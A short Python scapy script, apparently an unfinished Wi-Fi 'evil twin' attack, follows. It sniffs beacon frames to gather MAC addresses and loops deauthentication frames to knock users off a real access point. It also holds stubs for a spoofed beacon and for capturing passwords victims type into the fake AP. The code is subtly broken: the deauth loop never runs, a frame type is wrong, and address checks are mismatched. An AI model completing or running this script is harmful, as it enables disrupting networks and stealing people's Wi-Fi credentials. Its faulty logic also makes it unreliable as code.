#Import scapy for packet creation
#Import _thread for multiple processes
#I think there are some dependency issues with scapy. I am having to import all of the elements independently.
from scapy.all import *
import scapy.all as scapy
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import RadioTap
from _thread import *

mac_addresses = []

#Appends destination MAC addresses to a list to later be deauthenticated
def PacketHandler(packet):
    if packet.haslayer(Dot11):
        if packet.type == 0 and packet.subtype == 8:
            if packet.addr1 not in mac_addresses:
                mac_addresses.append(packet.addr2)

#Runs a loop of deauthentication frames to prevent people from accessing the real access point
def deauth(gateway):
    x=0
    while x > 5:
        for addr in mac_addresses:
            dot11 = Dot11(type= 8, subtype= 12, addr1= gateway, addr2= addr)
            packet = RadioTap()/dot11
            sendp(packet)
            x += 1

#Creates a fake beacon frame with the same SSID
def create_beacon():
    pass

#When someone accidentally types password into my spoofed AP I will recieve the password
def recieve_password():
    pass

def main():
    gateway = input('What SSID of the device you are attacking?: ')
    scapy.sniff(iface="Intel(R) Wi-Fi 6E AX211 160MHz", prn = PacketHandler, count= 5)
    start_new_thread(deauth, (gateway, ))
    
    

main()
